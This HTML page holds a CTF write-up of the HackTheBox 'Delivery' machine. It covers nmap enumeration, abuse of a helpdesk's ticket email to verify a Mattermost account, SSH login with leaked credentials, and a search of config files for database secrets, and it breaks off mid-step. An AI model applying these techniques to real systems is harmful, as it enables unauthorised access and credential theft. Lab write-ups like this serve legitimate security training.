<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Delivery | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Delivery HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/delivery/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/delivery/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Delivery "><meta property="og:description" content="Delivery HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/delivery/delivery.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-05-30T11:44:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/delivery/delivery.png"><meta name=twitter:title content="Delivery "><meta name=twitter:description content="Delivery HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Delivery ","item":"https://s4ch.github.io/writeups/hackthebox/delivery/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Delivery ","name":"Delivery ","description":"Delivery HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Delivery Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n1 $ sudo pacman -S nmap mentalist john Network enumeration Port and service scan with nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 # Nmap 7.91 scan initiated Tue Jan 26 20:17:53 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.222 Nmap scan report for 10.10.10.222 Host is up (0.032s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA) | 256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA) |_ 256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519) 80/tcp open http nginx 1.14.2 | http-methods: |_ Supported Methods: GET HEAD |_http-server-header: nginx/1.14.2 |_http-title: Welcome 8065/tcp open unknown | fingerprint-strings: | GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Accept-Ranges: bytes | Cache-Control: no-cache, max-age=31556926, public | Content-Length: 3108 | Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com | Content-Type: text/html; charset=utf-8 | Last-Modified: Tue, 26 Jan 2021 13:56:05 GMT | X-Frame-Options: SAMEORIGIN | X-Request-Id: t7o94xf1fbb87bff1tsup8wjcy | X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false | Date: Tue, 26 Jan 2021 19:27:29 GMT | \u003c!doctype html\u003eMattermost","wordCount":"1494","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/delivery/delivery.png","datePublished":"2021-05-30T11:44:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/delivery/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Delivery</h1><div class=post-description>Delivery HackTheBox writeup</div><div class=post-meta><span title='2021-05-30 11:44:00 +0000 UTC'>May 30, 2021</span>&nbsp;路&nbsp;8 min&nbsp;路&nbsp;1494 words&nbsp;路&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;路&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/delivery/delivery.png alt="Delivery HackTheBox Machine"><p>Delivery - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-discovery>Web discovery</a></li><li><a href=#web-exploitation>Web exploitation</a></li><li><a href=#system-exploitation>System exploitation</a></li><li><a href=#bonus>Bonus</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Delivery</li><li><strong>Profile:</strong> <a href=https://app.hackthebox.eu/machines/308>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo pacman -S nmap mentalist john
</span></span></code></pre></td></tr></table></div></div><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># Nmap 7.91 scan initiated Tue Jan 26 20:17:53 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.222
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.222
</span></span><span class=line><span class=cl>Host is up (0.032s latency).
</span></span><span class=line><span class=cl>Not shown: 65532 closed ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey:
</span></span><span class=line><span class=cl>|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
</span></span><span class=line><span class=cl>|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
</span></span><span class=line><span class=cl>80/tcp   open  http    nginx 1.14.2
</span></span><span class=line><span class=cl>| http-methods:
</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD
</span></span><span class=line><span class=cl>|_http-server-header: nginx/1.14.2
</span></span><span class=line><span class=cl>|_http-title: Welcome
</span></span><span class=line><span class=cl>8065/tcp open  unknown
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
</span></span><span class=line><span class=cl>|     HTTP/1.1 400 Bad Request
</span></span><span class=line><span class=cl>|     Content-Type: text/plain; charset=utf-8
</span></span><span class=line><span class=cl>|     Connection: close
</span></span><span class=line><span class=cl>|     Request
</span></span><span class=line><span class=cl>|   GetRequest:
</span></span><span class=line><span class=cl>|     HTTP/1.0 200 OK
</span></span><span class=line><span class=cl>|     Accept-Ranges: bytes
</span></span><span class=line><span class=cl>|     Cache-Control: no-cache, max-age=31556926, public
</span></span><span class=line><span class=cl>|     Content-Length: 3108
</span></span><span class=line><span class=cl>|     Content-Security-Policy: frame-ancestors &#39;self&#39;; script-src &#39;self&#39; cdn.rudderlabs.com
</span></span><span class=line><span class=cl>|     Content-Type: text/html; charset=utf-8
</span></span><span class=line><span class=cl>|     Last-Modified: Tue, 26 Jan 2021 13:56:05 GMT
</span></span><span class=line><span class=cl>|     X-Frame-Options: SAMEORIGIN
</span></span><span class=line><span class=cl>|     X-Request-Id: t7o94xf1fbb87bff1tsup8wjcy
</span></span><span class=line><span class=cl>|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
</span></span><span class=line><span class=cl>|     Date: Tue, 26 Jan 2021 19:27:29 GMT
</span></span><span class=line><span class=cl>|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;meta charset=&#34;utf-8&#34;&gt;&lt;meta name=&#34;viewport&#34; content=&#34;width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0&#34;&gt;&lt;meta name=&#34;robots&#34; content=&#34;noindex, nofollow&#34;&gt;&lt;meta name=&#34;referrer&#34; content=&#34;no-referrer&#34;&gt;&lt;title&gt;Mattermost&lt;/title&gt;&lt;meta name=&#34;mobile-web-app-capable&#34; content=&#34;yes&#34;&gt;&lt;meta name=&#34;application-name&#34; content=&#34;Mattermost&#34;&gt;&lt;meta name=&#34;format-detection&#34; content=&#34;telephone=no&#34;&gt;&lt;link re
</span></span><span class=line><span class=cl>|   HTTPOptions:
</span></span><span class=line><span class=cl>|     HTTP/1.0 405 Method Not Allowed
</span></span><span class=line><span class=cl>|     Date: Tue, 26 Jan 2021 19:27:29 GMT
</span></span><span class=line><span class=cl>|_    Content-Length: 0
</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port8065-TCP:V=7.91%I=7%D=1/26%Time=60106AFC%P=x86_64-unknown-linux-gnu
</span></span><span class=line><span class=cl>SF:%r(GenericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
</span></span><span class=line><span class=cl>SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
</span></span><span class=line><span class=cl>SF:Bad\x20Request&#34;)%r(GetRequest,DF3,&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ran
</span></span><span class=line><span class=cl>SF:ges:\x20bytes\r\nCache-Control:\x20no-cache,\x20max-age=31556926,\x20pu
</span></span><span class=line><span class=cl>SF:blic\r\nContent-Length:\x203108\r\nContent-Security-Policy:\x20frame-an
</span></span><span class=line><span class=cl>SF:cestors\x20&#39;self&#39;;\x20script-src\x20&#39;self&#39;\x20cdn\.rudderlabs\.com\r\nC
</span></span><span class=line><span class=cl>SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\x20Tue,\x
</span></span><span class=line><span class=cl>SF:2026\x20Jan\x202021\x2013:56:05\x20GMT\r\nX-Frame-Options:\x20SAMEORIGI
</span></span><span class=line><span class=cl>SF:N\r\nX-Request-Id:\x20t7o94xf1fbb87bff1tsup8wjcy\r\nX-Version-Id:\x205\
</span></span><span class=line><span class=cl>SF:.30\.0\.5\.30\.1\.57fb31b889bf81d99d8af8176d4bbaaa\.false\r\nDate:\x20T
</span></span><span class=line><span class=cl>SF:ue,\x2026\x20Jan\x202021\x2019:27:29\x20GMT\r\n\r\n&lt;!doctype\x20html&gt;&lt;h
</span></span><span class=line><span class=cl>SF:tml\x20lang=\&#34;en\&#34;&gt;&lt;head&gt;&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;&lt;meta\x20name=\&#34;vie
</span></span><span class=line><span class=cl>SF:wport\&#34;\x20content=\&#34;width=device-width,initial-scale=1,maximum-scale=1
</span></span><span class=line><span class=cl>SF:,user-scalable=0\&#34;&gt;&lt;meta\x20name=\&#34;robots\&#34;\x20content=\&#34;noindex,\x20no
</span></span><span class=line><span class=cl>SF:follow\&#34;&gt;&lt;meta\x20name=\&#34;referrer\&#34;\x20content=\&#34;no-referrer\&#34;&gt;&lt;title&gt;M
</span></span><span class=line><span class=cl>SF:attermost&lt;/title&gt;&lt;meta\x20name=\&#34;mobile-web-app-capable\&#34;\x20content=\&#34;
</span></span><span class=line><span class=cl>SF:yes\&#34;&gt;&lt;meta\x20name=\&#34;application-name\&#34;\x20content=\&#34;Mattermost\&#34;&gt;&lt;met
</span></span><span class=line><span class=cl>SF:a\x20name=\&#34;format-detection\&#34;\x20content=\&#34;telephone=no\&#34;&gt;&lt;link\x20re&#34;
</span></span><span class=line><span class=cl>SF:)%r(HTTPOptions,5B,&#34;HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nDat
</span></span><span class=line><span class=cl>SF:e:\x20Tue,\x2026\x20Jan\x202021\x2019:27:29\x20GMT\r\nContent-Length:\x
</span></span><span class=line><span class=cl>SF:200\r\n\r\n&#34;)%r(RTSPRequest,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
</span></span><span class=line><span class=cl>SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
</span></span><span class=line><span class=cl>SF:n\r\n400\x20Bad\x20Request&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Requ
</span></span><span class=line><span class=cl>SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
</span></span><span class=line><span class=cl>SF:close\r\n\r\n400\x20Bad\x20Request&#34;)%r(SSLSessionReq,67,&#34;HTTP/1\.1\x204
</span></span><span class=line><span class=cl>SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
</span></span><span class=line><span class=cl>SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(TerminalServerC
</span></span><span class=line><span class=cl>SF:ookie,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
</span></span><span class=line><span class=cl>SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
</span></span><span class=line><span class=cl>SF:uest&#34;);
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/bin/../share/nmap
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl># Nmap done at Tue Jan 26 20:19:44 2021 -- 1 IP address (1 host up) scanned in 111.16 seconds
</span></span></code></pre></td></tr></table></div></div><h2 id=web-discovery>Web discovery<a hidden class=anchor aria-hidden=true href=#web-discovery>#</a></h2><p>On http://10.10.10.222/ we can see a link to <a href=http://helpdesk.delivery.htb/>http://helpdesk.delivery.htb/</a> and
another one <a href=http://delivery.htb:8065/>http://delivery.htb:8065/</a>.</p><p>So we can set an entry for this local domain:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/hosts | grep delivery
</span></span><span class=line><span class=cl>10.10.10.222 helpdesk.delivery.htb
</span></span><span class=line><span class=cl>10.10.10.222 delivery.htb
</span></span></code></pre></td></tr></table></div></div><p>At <a href=http://helpdesk.delivery.htb/>http://helpdesk.delivery.htb/</a> the software running is <a href=https://osticket.com/>osTicket</a>.</p><p>We can find the <a href=https://github.com/osTicket/osTicket>source code</a> online, it may be
more efficient to find page than enumerating with ffuf.</p><h2 id=web-exploitation>Web exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h2><p>Create a new ticket.</p><p>The app tell you you have an email address: <a href=mailto:8902868@delivery.htb>8902868@delivery.htb</a></p><p>Now you can go on the Mattermost page (port 8065) and register using
the email we received and a random password.</p><p><code>8902868@delivery.htb</code> / <code>password1234A!</code></p><p><a href="http://delivery.htb:8065/should_verify_email?email=8902868%40delivery.htb">http://delivery.htb:8065/should_verify_email?email=8902868%40delivery.htb</a></p><p>Mattermost will send you a registration check link by email.</p><p>So refresh the ticket page, eg. <a href="http://helpdesk.delivery.htb/tickets.php?id=8902868">http://helpdesk.delivery.htb/tickets.php?id=8902868</a></p><p>And a new message appeared with the content of the registration mail:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>---- Registration Successful ---- Please activate your email by going to: http://delivery.htb:8065/do_verify_email?token=rboda3gqxmnesjgrrt89kb5hriekno18hr8wqpar53km93q4mg5dsj63g31tujaq&amp;email=8902868%40delivery.htb
</span></span></code></pre></td></tr></table></div></div><p>We can use the link to validate our account and then login to Mattermost.</p><p>The idea is that some companies will will automatically accepts registrations
on the internal chat app from emails with a <code>@company</code> domain for their employees
but some services like a issue tracker, support panel, will be configured
to automatically generate an email address for each issue that the user can
read and receive some account validation links and gain unauthorized access
to the internal chat app.</p><p>The home page contains two messages, the first one gives us credentials that are working
over ssh:</p><blockquote><p>@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail!</p><p>Also please create a program to help us stop re-using the same passwords everywhere&mldr;. Especially those that are a variant of &ldquo;PleaseSubscribe!&rdquo;</p></blockquote><p>The second message must be a hint for the following steps:</p><blockquote><p>PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.</p></blockquote><h2 id=system-exploitation>System exploitation<a hidden class=anchor aria-hidden=true href=#system-exploitation>#</a></h2><p>Grab the user flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh maildeliverer@10.10.10.222
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>maildeliverer@Delivery:~$ id
</span></span><span class=line><span class=cl>uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>maildeliverer@Delivery:~$ cat user.txt
</span></span><span class=line><span class=cl>4aa9052226e3c4d3d653259d524f1fa9
</span></span></code></pre></td></tr></table></div></div><p>What have we in the user directory?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maildeliverer@Delivery:~$ ls -lhA
</span></span><span class=line><span class=cl>total 5.4M
</span></span><span class=line><span class=cl>lrwxrwxrwx 1 root          root             9 Dec 28 07:04 .bash_history -&gt; /dev/null
</span></span><span class=line><span class=cl>-rw-r--r-- 1 maildeliverer maildeliverer  220 Dec 26 09:01 .bash_logout
</span></span><span class=line><span class=cl>-rw-r--r-- 1 maildeliverer maildeliverer 3.5K Dec 26 09:01 .bashrc
</span></span><span class=line><span class=cl>drwx------ 3 maildeliverer maildeliverer 4.0K Dec 28 06:58 .gnupg
</span></span><span class=line><span class=cl>-rw------- 1 maildeliverer maildeliverer  230 Jan 26 15:39 .mysql_history
</span></span><span class=line><span class=cl>-rw-r--r-- 1 maildeliverer maildeliverer  807 Dec 26 09:01 .profile
</span></span><span class=line><span class=cl>-r-------- 1 maildeliverer maildeliverer   33 Jan 26 14:32 user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>maildeliverer@Delivery:~$ cat .mysql_history
</span></span><span class=line><span class=cl>show databases;
</span></span><span class=line><span class=cl>use mattermost;
</span></span><span class=line><span class=cl>show tables;
</span></span><span class=line><span class=cl>select * from users;
</span></span><span class=line><span class=cl>select * from Users;
</span></span><span class=line><span class=cl>select Username, Password from Users;
</span></span><span class=line><span class=cl>show databases
</span></span><span class=line><span class=cl>;
</span></span><span class=line><span class=cl>use mattermost
</span></span><span class=line><span class=cl>show tables
</span></span><span class=line><span class=cl>;
</span></span><span class=line><span class=cl>select * from Users;
</span></span><span class=line><span class=cl>select Username, Password from Users;
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s find the mattermost install directory it must contains some SQL credentials
where we could use to dump the same table as in our mysql history.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>maildeliverer</span><span class=err>@</span><span class=n>Delivery</span><span class=p>:</span><span class=o>~$</span> <span class=n>find</span> <span class=o>/</span> <span class=o>-</span><span class=n>name</span> <span class=n>mattermost</span> <span class=o>-</span><span class=n>type</span> <span class=n>d</span> <span class=mi>2</span><span class=o>&gt;/</span><span class=n>dev</span><span class=o>/</span><span class=n>null</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>mattermost</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>mysql</span><span class=o>/</span><span class=n>mattermost</span>
</span></span></code></pre></td></tr></table></div></div><p>We can find there is a SQL section in the configuration:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>maildeliverer@Delivery:~$ grep -i sql /opt/mattermost/config/config.json
</span></span><span class=line><span class=cl>    &#34;SqlSettings&#34;: {
</span></span><span class=line><span class=cl>        &#34;DriverName&#34;: &#34;mysql&#34;,
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s open the file with less, search <code>SqlSettings</code>, and see:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
